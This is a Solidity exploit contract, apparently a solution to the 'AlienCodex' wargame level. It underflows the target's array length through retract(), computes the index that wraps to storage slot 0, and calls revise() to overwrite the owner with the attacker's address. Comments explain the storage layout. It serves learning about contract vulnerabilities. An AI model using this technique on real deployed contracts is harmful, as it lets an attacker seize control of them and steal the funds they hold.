pragma solidity 0.8.18; 

interface IAlienCodex {

  function make_contact() external;
  function retract() external;
  function owner() external view returns (address);
  function revise(uint i, bytes32 _content) external;
}

  // uint8 public a=7 // 1 byte
  // uint16 public b=12 // 2 bytes
  // address public c=0xasdkhfk...... // 20 bytes
  // bool d=true //1 byte
  // uint64 public e=12 //8 bytes
  // uint256 public f=213 // 32 bytes
  //
  //MAX Storage slot is: 32 bytes;

contract Attacker{

  // Slot 0 = _owner (address = 20 bytes) + contact (bool 1 bytes)
  // Slot 1 =  codex[]


  constructor(IAlienCodex _address) {

    IAlienCodex target = _address;
    target.make_contact(); // Switch contact to true (Modifier)
    target.retract(); // Underflow the array to go to the previous Storage slot (Slot 0) (Where the _owner is stored)
    // After underflowing the array we need to get in which slot is the owner.
    uint256 a = uint256(keccak256(abi.encode(uint256(1))));
    uint256 b;
    unchecked{
      b -= a;
    }
    target.revise(b, bytes32(uint256(uint160(msg.sender)))); // Modify the slot 0 (owner) with the caller address
    require(target.owner() == msg.sender,"didn't work");
  }
}
